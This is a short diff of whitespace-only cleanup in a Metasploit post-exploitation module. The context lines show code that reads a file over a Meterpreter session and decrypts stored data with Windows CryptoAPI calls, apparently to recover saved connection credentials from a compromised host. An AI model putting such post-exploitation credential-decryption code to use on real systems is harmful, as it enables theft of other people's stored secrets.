@@ -86,7 +86,7 @@ class Metasploit3 < Msf::Post
 			until connections.eof
 				condata << connections.read
 			end
-			return condata			
+			return condata
 		rescue Rex::Post::Meterpreter::RequestError => e
 			print_error "Received error code #{e.code} when reading #{path}"
 			return nil
@@ -142,7 +142,7 @@ class Metasploit3 < Msf::Post
 		decrypted      = advapi32.CryptDecrypt(derivekey['phKey'], 0, true, 0, cipher, cipher.length)
 		destroyhash    = advapi32.CryptDestroyHash(createhash['phHash'])
 		destroykey     = advapi32.CryptDestroyKey(derivekey['phKey'])
-		releasecontext = advapi32.CryptReleaseContext(acquirecontext['phProv'], 0)	
+		releasecontext = advapi32.CryptReleaseContext(acquirecontext['phProv'], 0)
 
 		data = decrypted['pbData']
 		data.gsub!(/[\x00]/, '')
